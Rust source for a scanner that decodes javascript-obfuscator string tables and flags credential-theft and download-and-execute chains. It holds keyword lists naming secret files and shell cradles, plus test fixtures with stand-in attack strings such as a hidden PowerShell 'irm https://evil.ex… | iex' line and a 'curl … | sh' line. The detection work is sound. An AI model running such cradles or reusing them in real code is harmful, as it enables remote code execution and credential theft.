//! What a javascript-obfuscator file calls, from its string table.
//!
//! The obfuscator moves every string literal into one array
//! (`const _0x2e30=['readFileSync','post',…]`) and calls APIs through it
//! (`fs[_0x5d1b(0x1be)](p)`), so no rule sees `readFileSync(` or a URL.
//! The array itself still holds the names: decode it, then ask which kinds
//! of behaviour those names add up to. Options it may have used:
//! `stringArrayEncoding: base64` (custom alphabet, decoded here), `rc4`
//! (decoded with the keys found at the call sites) and `splitStrings`
//! (literals cut into fixed-length pieces and shuffled, so `powershell` and
//! `"irm https` arrive as separate entries, and a name may be cut in two).
//!
//! shortcut: a name cut into three or more pieces is not reassembled; that
//! needs the call sites resolved through the array rotation.

use crate::RuleMatch;
use regex::Regex;
use std::collections::BTreeSet;
use std::sync::LazyLock;

/// `'…' + '…'` on one line, whatever the quotes: the join to remove.
static CONCAT: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r#"['"`][ \t]*\+[ \t]*['"`]"#).unwrap());
static CHAR_ESCAPE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"\\(?:x([0-9a-fA-F]{2})|u00([0-9a-fA-F]{2})|u\{([0-9a-fA-F]{2})\})").unwrap()
});
static CHAR_CODES: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?:String\.fromCharCode\(\s*(\d{2,3}(?:\s*,\s*\d{2,3}){1,63})\s*\)|bytes\(\[\s*(\d{2,3}(?:\s*,\s*\d{2,3}){1,63})\s*\]\)\.decode\(\))").unwrap()
});
static REVERSED: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"['"]([A-Za-z0-9_./:-]{3,60})['"](?:\.split\(\s*['"]{2}\s*\)\.reverse\(\)\.join\(\s*['"]{2}\s*\)|\[::-1\])"#).unwrap()
});

/// `obj['name']`, which is `obj.name` to the engine and not to a rule.
static BRACKET_NAME: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r#"\[\s*['"]([A-Za-z_$][\w$]{1,40})['"]\s*\]"#).unwrap());

/// `content` with five cheap string disguises undone, so the rules see the
/// name a line spells: `'fe'+'tch'`, `\x66etch`, `String.fromCharCode(102,
/// 101,…)`, `'hctef'.split('').reverse().join('')` and `globalThis['fetch']`.
/// Borrowed when the file uses none of them. No line is added or removed, so a line number in
/// the result is the line number in the file.
pub fn plain(content: &str) -> std::borrow::Cow<'_, str> {
    use std::borrow::Cow;
    // Letters, digits and what names and URLs are made of: never a quote, a
    // backslash or a line break, which would change what the text means.
    let name_char = |c: char| c.is_ascii_alphanumeric() || "._-/: ".contains(c);
    let mut text = Cow::Borrowed(content);
    let escapes = CHAR_ESCAPE.replace_all(&text, |c: &regex::Captures| {
        let hex = c.iter().skip(1).flatten().next().map_or("", |m| m.as_str());
        match u8::from_str_radix(hex, 16).map(char::from) {
            Ok(ch) if name_char(ch) => ch.to_string(),
            _ => c[0].to_string(),
        }
    });
    if let Cow::Owned(s) = escapes {
        text = Cow::Owned(s);
    }
    let codes = CHAR_CODES.replace_all(&text, |c: &regex::Captures| {
        let list = c.get(1).or(c.get(2)).map_or("", |m| m.as_str());
        let decoded: Option<String> = list
            .split(',')
            .map(|n| {
                n.trim()
                    .parse::<u8>()
                    .ok()
                    .map(char::from)
                    .filter(|ch| name_char(*ch))
            })
            .collect();
        decoded.map_or_else(|| c[0].to_string(), |s| format!("'{s}'"))
    });
    if let Cow::Owned(s) = codes {
        text = Cow::Owned(s);
    }
    let reversed = REVERSED.replace_all(&text, |c: &regex::Captures| {
        format!("'{}'", c[1].chars().rev().collect::<String>())
    });
    if let Cow::Owned(s) = reversed {
        text = Cow::Owned(s);
    }
    if let Cow::Owned(s) = CONCAT.replace_all(&text, "") {
        text = Cow::Owned(s);
    }
    if let Cow::Owned(s) = BRACKET_NAME.replace_all(&text, ".$1") {
        text = Cow::Owned(s);
    }
    match text {
        Cow::Owned(s) if s != content => Cow::Owned(s),
        _ => Cow::Borrowed(content),
    }
}

pub const OBFUSCATED_CREDENTIAL_THEFT: &str = "Chain: Obfuscated Credential Theft";
pub const OBFUSCATED_DOWNLOAD_EXEC: &str = "Chain: Obfuscated Download and Execute";

static STRING_ARRAY: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?:const|var|let)\s+_0x[0-9a-f]{4,6}\s*=\s*\[((?:\s*(?:'(?:[^'\\\n]|\\.)*'|"(?:[^"\\\n]|\\.)*")\s*,?)+)\]"#)
        .unwrap()
});
static LITERAL: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r#"'((?:[^'\\]|\\.)*)'|"((?:[^"\\]|\\.)*)""#).unwrap());
static ESCAPE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\\x([0-9a-fA-F]{2})|\\u([0-9a-fA-F]{4})").unwrap());

/// An rc4 key at a call site: `_0x59af(0x12f,'bYDK')`, either argument order.
static RC4_KEY: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"[(,]\s*'([^'\\]{4})'\s*[,)]").unwrap());
/// The obfuscator draws its keys from a pool of 50; other 4-char literals
/// in call arguments are tried too and decode to nothing.
const MAX_RC4_KEYS: usize = 128;

/// The obfuscator's base64 alphabet: lower case first.
const OBF_ALPHABET: &[u8] = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/";

fn unescape(s: &str) -> String {
    ESCAPE
        .replace_all(s, |c: &regex::Captures| {
            let hex = c.get(1).or_else(|| c.get(2)).map_or("", |m| m.as_str());
            u32::from_str_radix(hex, 16)
                .ok()
                .and_then(char::from_u32)
                .map(String::from)
                .unwrap_or_default()
        })
        .into_owned()
}

fn obf_base64(s: &str) -> Option<String> {
    let mut bits = 0u32;
    let mut nbits = 0;
    let mut out = Vec::new();
    for c in s.trim_end_matches('=').bytes() {
        let v = OBF_ALPHABET.iter().position(|&a| a == c)? as u32;
        bits = (bits << 6) | v;
        nbits += 6;
        if nbits >= 8 {
            nbits -= 8;
            out.push((bits >> nbits) as u8);
            bits &= (1 << nbits) - 1;
        }
    }
    String::from_utf8(out).ok()
}

fn readable(s: &str) -> bool {
    !s.is_empty()
        && s.chars().all(|c| !c.is_control())
        && s.chars().filter(|c| c.is_ascii_alphanumeric()).count() * 2 >= s.chars().count()
}

/// RC4 key schedule.
fn rc4_state(key: &[u8]) -> [u8; 256] {
    let mut s: [u8; 256] = std::array::from_fn(|i| i as u8);
    let mut j = 0u8;
    for i in 0..256 {
        j = j.wrapping_add(s[i]).wrapping_add(key[i % key.len()]);
        s.swap(i, j as usize);
    }
    s
}

/// `cipher` under the key behind `state`, if it comes out as printable
/// ASCII; a wrong key fails within a byte or two.
fn rc4_printable(mut s: [u8; 256], cipher: &[u8]) -> Option<String> {
    let (mut i, mut j) = (0u8, 0u8);
    let mut out = String::with_capacity(cipher.len());
    for &c in cipher {
        i = i.wrapping_add(1);
        j = j.wrapping_add(s[i as usize]);
        s.swap(i as usize, j as usize);
        let p = c ^ s[s[i as usize].wrapping_add(s[j as usize]) as usize];
        if !(0x20..0x7f).contains(&p) {
            return None;
        }
        out.push(p as char);
    }
    Some(out)
}

/// `stringArrayEncoding: rc4`: each entry is base64 of RC4 ciphertext and
/// the key is a literal at the call site. Which key belongs to which entry
/// depends on the array rotation, so every key is tried on every entry and
/// whatever decrypts to printable text is kept. Empty unless most entries
/// decrypt: a plain table must stay as it is.
fn rc4_table(content: &str, raw: &[String]) -> Vec<String> {
    let keys: BTreeSet<&str> = RC4_KEY
        .captures_iter(content)
        .filter_map(|c| c.get(1).map(|m| m.as_str()))
        .collect();
    let states: Vec<[u8; 256]> = keys
        .iter()
        .take(MAX_RC4_KEYS)
        .map(|k| rc4_state(k.as_bytes()))
        .collect();
    let mut out = Vec::new();
    let mut decrypted = 0;
    for entry in raw {
        // The ciphertext was UTF-8 encoded before base64: one char per byte.
        let Some(cipher) = obf_base64(entry).and_then(|d| {
            d.chars()
                .map(|c| u8::try_from(c as u32).ok())
                .collect::<Option<Vec<u8>>>()
        }) else {
            continue;
        };
        // Shorter than the shortest name the chains look for: a wrong key
        // passes too easily and the right one adds nothing.
        if cipher.len() < 3 {
            continue;
        }
        let before = out.len();
        out.extend(states.iter().filter_map(|s| rc4_printable(*s, &cipher)));
        decrypted += usize::from(out.len() > before);
    }
    if decrypted * 5 >= raw.len() * 3 {
        out
    } else {
        Vec::new()
    }
}

/// The decoded string table of an obfuscated file; empty when there is none.
pub fn string_table(content: &str) -> Vec<String> {
    let raw: Vec<String> = STRING_ARRAY
        .captures_iter(content)
        .flat_map(|c| {
            LITERAL
                .captures_iter(&c[1])
                .filter_map(|l| l.get(1).or_else(|| l.get(2)).map(|m| unescape(m.as_str())))
                .collect::<Vec<_>>()
        })
        .collect();
    // Base64 when most entries decode to readable text; plain otherwise.
    let decoded: Vec<String> = raw
        .iter()
        .filter_map(|s| obf_base64(s).filter(|d| readable(d)))
        .collect();
    if decoded.len() * 5 >= raw.len() * 3 && !decoded.is_empty() {
        return decoded;
    }
    let rc4 = rc4_table(content, &raw);
    if rc4.is_empty() {
        raw
    } else {
        rc4
    }
}

/// `splitStrings` cuts every literal into chunks of one length, so most
/// entries share it: the chunk length, when at least 2 in 5 entries have it.
fn chunk_len(table: &[String]) -> Option<usize> {
    let mut counts = std::collections::BTreeMap::new();
    for s in table {
        *counts.entry(s.len()).or_insert(0usize) += 1;
    }
    let (&len, &n) = counts.iter().max_by_key(|(_, &n)| n)?;
    (len >= 3 && n * 5 >= table.len() * 2).then_some(len)
}

/// A name cut across two chunks: `readF` + `ileSy` for `readfile`. The head
/// must be a full chunk and each side at least 3 characters, so `thread` +
/// `filename` in an unsplit table is not a file read.
fn straddles(lower: &[String], chunk: usize, needle: &str) -> Option<String> {
    (3..needle.len().saturating_sub(2)).find_map(|k| {
        let (head, tail) = needle.split_at(k);
        let h = lower
            .iter()
            .find(|s| s.len() == chunk && s.ends_with(head))?;
        let t = lower.iter().find(|s| s.starts_with(tail))?;
        Some(format!("{}{}", h, t))
    })
}

fn any_contains(table: &[String], needles: &[&str]) -> Option<String> {
    let whole = table.iter().find_map(|s| {
        let lower = s.to_ascii_lowercase();
        needles.iter().any(|n| lower.contains(n)).then(|| s.clone())
    });
    whole.or_else(|| {
        let chunk = chunk_len(table)?;
        let lower: Vec<String> = table.iter().map(|s| s.to_ascii_lowercase()).collect();
        needles.iter().find_map(|n| straddles(&lower, chunk, n))
    })
}

/// Behaviour chains read off a decoded string table. Each needs evidence of
/// every step in the table itself: Live Share's obfuscated loader holds
/// none of these names.
pub fn chains(rel_path: &str, table: &[String]) -> Vec<RuleMatch> {
    let mut out = Vec::new();
    let chain = |name: &str, parts: Vec<String>| RuleMatch {
        file_path: rel_path.to_string(),
        line_number: 1,
        matched_pattern: name.to_string(),
        severity: "critical".to_string(),
        context: format!("Obfuscated string table holds: {}", parts.join(" + ")),
    };

    let read = any_contains(table, &["readfile", "readdir", "createreadstream"]);
    let secret = any_contains(
        table,
        &[
            ".env",
            "id_rsa",
            ".ssh",
            ".npmrc",
            "config.toml",
            "login data",
            "local storage",
            "wallet",
            "keychain",
            "cookies",
            ".aws",
            "credentials",
        ],
    );
    let send = any_contains(
        table,
        &[
            "post",
            "content-disposition",
            "multipart",
            "upload",
            "webhook",
            "https://",
            "http://",
        ],
    );
    if let (Some(r), Some(s), Some(n)) = (read, secret, send) {
        out.push(chain(OBFUSCATED_CREDENTIAL_THEFT, vec![r, s, n]));
    }

    let shell = any_contains(
        table,
        &[
            "powershell",
            "child_process",
            "cmd.exe",
            "/bin/sh",
            "/bin/bash",
            "execsync",
            "spawn",
        ],
    );
    let cradle = any_contains(
        table,
        &[
            "irm ",
            "iwr ",
            "| ie",
            "|ie",
            "iex",
            "invoke-expression",
            "downloadstring",
            "downloadfile",
            "curl ",
            "wget ",
            "windowstyle",
            "-enc",
        ],
    );
    if let (Some(s), Some(c)) = (shell, cradle) {
        out.push(chain(OBFUSCATED_DOWNLOAD_EXEC, vec![s, c]));
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn plain_undoes_the_string_disguises_and_keeps_the_lines() {
        let src = "const f = globalThis['fe'+'tch'];\nconst r = \"\\x72\\x65quire\";\n\
                   const c = String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115);\n\
                   w['hctef'.split('').reverse().join('')](u);\nh = 'emantsoh'[::-1]\n";
        let plain = plain(src);
        for name in [
            "globalThis.fetch;",
            "\"require\"",
            "'child_process'",
            "w.fetch(u)",
            "'hostname'",
        ] {
            assert!(plain.contains(name), "{name} not in {plain}");
        }
        assert_eq!(plain.lines().count(), src.lines().count());
        // Nothing to undo: no copy. An escaped quote or line break stays escaped.
        assert!(matches!(
            plain_of("let a = b + 'c';"),
            std::borrow::Cow::Borrowed(_)
        ));
        assert_eq!(plain_of("s = '\\x27\\x0a'"), "s = '\\x27\\x0a'");
    }

    fn plain_of(s: &str) -> std::borrow::Cow<'_, str> {
        plain(s)
    }

    fn names(v: &[RuleMatch]) -> Vec<&str> {
        v.iter().map(|m| m.matched_pattern.as_str()).collect()
    }

    fn encode(s: &str) -> String {
        // Inverse of obf_base64, for building fixtures.
        let mut out = String::new();
        for chunk in s.as_bytes().chunks(3) {
            let n = chunk.iter().fold(0u32, |a, &b| (a << 8) | b as u32) << (8 * (3 - chunk.len()));
            for i in 0..=chunk.len() {
                out.push(OBF_ALPHABET[((n >> (18 - 6 * i)) & 63) as usize] as char);
            }
        }
        out
    }

    #[test]
    fn plain_table_with_file_read_secret_and_upload_is_theft() {
        // gleb-js shape: fs[_0x(…)](…) over a plain string array.
        let src = "function _0x2470(){const _0x2e306f=['readdirSync','post','.env','Content-Disposition','\\x63onfig.toml','join'];_0x2470=function(){return _0x2e306f;};return _0x2470();}";
        let table = string_table(src);
        assert!(table.contains(&"config.toml".to_string()));
        assert_eq!(
            names(&chains("index.js", &table)),
            vec![OBFUSCATED_CREDENTIAL_THEFT]
        );
    }

    #[test]
    fn base64_split_strings_powershell_cradle() {
        // vs-ranket shape: base64 entries, literals split into 10-char pieces.
        let pieces = [
            "powershell",
            " -WindowSt",
            "yle Hidden",
            "\"irm https",
            "://evil.ex",
            "1.txt | ie",
            "log",
        ];
        let array = pieces
            .iter()
            .map(|p| format!("'{}'", encode(p)))
            .collect::<Vec<_>>()
            .join(",");
        let src = format!("const _0x4a1f=[{}];", array);
        let table = string_table(&src);
        assert!(table.contains(&"powershell".to_string()), "{:?}", table);
        assert_eq!(
            names(&chains("ext.js", &table)),
            vec![OBFUSCATED_DOWNLOAD_EXEC]
        );
    }

    #[test]
    fn rc4_table_is_decrypted_with_the_call_site_keys() {
        // Shape of `--string-array-encoding rc4` output (javascript-obfuscator 5.10).
        let entries = [
            ("readFileSync", "bYDK"),
            ("/.npmrc", "Zo]n"),
            ("POST", "uLOo"),
            ("child_process", "0[5O"),
            ("curl https://collect.example.net/x.sh | sh", "ZkI5"),
        ];
        let array = entries
            .iter()
            .map(|(plain, key)| {
                let mut s = rc4_state(key.as_bytes());
                let (mut i, mut j) = (0u8, 0u8);
                let cipher: String = plain
                    .bytes()
                    .map(|b| {
                        i = i.wrapping_add(1);
                        j = j.wrapping_add(s[i as usize]);
                        s.swap(i as usize, j as usize);
                        (b ^ s[s[i as usize].wrapping_add(s[j as usize]) as usize]) as char
                    })
                    .collect();
                format!("'{}'", encode(&cipher))
            })
            .collect::<Vec<_>>()
            .join(",");
        // Keys sit at the call sites, in either argument position.
        let calls = "fs[a0(0x13a,'bYDK')](p+a0(0x14c,'Zo]n'));x(a0(0x142,'uLOo'));\
                     require(b0('0[5O',0x131))[b0('ZkI5',0x14b)]();";
        let src = format!("const _0x1a1c4a=[{}];{}", array, calls);
        let table = string_table(&src);
        assert!(table.contains(&"readFileSync".to_string()), "{:?}", table);
        assert_eq!(
            names(&chains("index.js", &table)),
            vec![OBFUSCATED_CREDENTIAL_THEFT, OBFUSCATED_DOWNLOAD_EXEC]
        );
        // Without the keys nothing decrypts and the table stays raw.
        let keyless = format!("const _0x1a1c4a=[{}];", array);
        assert!(chains("index.js", &string_table(&keyless)).is_empty());
    }

    #[test]
    fn names_cut_across_two_chunks_are_found() {
        // `--split-strings-chunk-length 5`: readFileSync, execSync, "curl https".
        let split: Vec<String> = [
            "readF", "ileSy", "nc", "execS", "ync", "curl ", "https", "://ex", "ample", "POST",
            ".env",
        ]
        .iter()
        .map(|s| s.to_string())
        .collect();
        assert_eq!(
            names(&chains("index.js", &split)),
            vec![OBFUSCATED_CREDENTIAL_THEFT, OBFUSCATED_DOWNLOAD_EXEC]
        );
        // An unsplit table has no common chunk length: `thread` + `filename`
        // is not a file read.
        let plain: Vec<String> = ["thread", "filename", ".env", "post", "constructor", "a"]
            .iter()
            .map(|s| s.to_string())
            .collect();
        assert!(chains("index.js", &plain).is_empty());
    }

    #[test]
    fn obfuscated_loader_without_those_names_is_quiet() {
        // Live Share's obfuscated host check: no file read, secret or shell.
        let src = "const _0x1a2b=['platform','version','arch','toString','length','apply','constructor'];";
        assert!(chains("checkHostApp.js", &string_table(src)).is_empty());
        assert!(string_table("const x = ['a', 'b'];").is_empty());
    }
}
